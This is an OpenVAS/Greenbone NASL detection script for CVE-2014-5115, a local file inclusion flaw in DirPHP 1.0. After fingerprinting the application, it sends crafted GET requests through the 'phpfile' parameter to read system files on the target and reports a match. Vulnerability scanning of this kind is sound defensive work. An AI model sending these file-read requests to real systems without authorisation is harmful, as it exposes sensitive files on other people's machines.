# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804738");
  script_version("2025-04-15T05:54:49+0000");
  script_cve_id("CVE-2014-5115");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2014-08-11 19:18:06 +0530 (Mon, 11 Aug 2014)");
  script_name("DirPHP 'path/index.php' Local File Include Vulnerability");

  script_tag(name:"summary", value:"DirPHP is prone to local file inclusion vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
  local file or not.");

  script_tag(name:"insight", value:"Flaw is due to the index.php script not properly sanitizing user input,
  specifically absolute paths supplied via the 'phpfile' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read arbitrary files
  on the target system.");

  script_tag(name:"affected", value:"DirPHP version 1.0");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34173");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/68943");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/127642");
  script_xref(name:"URL", value:"http://bot24.blogspot.in/2014/07/dirphp-10-lfi-vulnerability.html");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("host_details.inc");
include("os_func.inc");

http_port = http_get_port(default:80);
if(!http_can_host_php(port:http_port)){
  exit(0);
}

files = traversal_files();

foreach dir (make_list_unique("/", "/phpdir", "/resources", http_cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";
  rcvRes = http_get_cache(item:string(dir, "/index.php"),  port:http_port);

  if(">DirPHP" >< rcvRes && "Created & Maintained by Stuart Montgomery<" >< rcvRes)
  {

    foreach file (keys(files))
    {
      url = dir + "/index.php?phpfile=/" + files[file];

      if(http_vuln_check(port:http_port, url:url, pattern:file))
      {
        report = http_report_vuln_url( port:http_port, url:url );
        security_message(port:http_port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
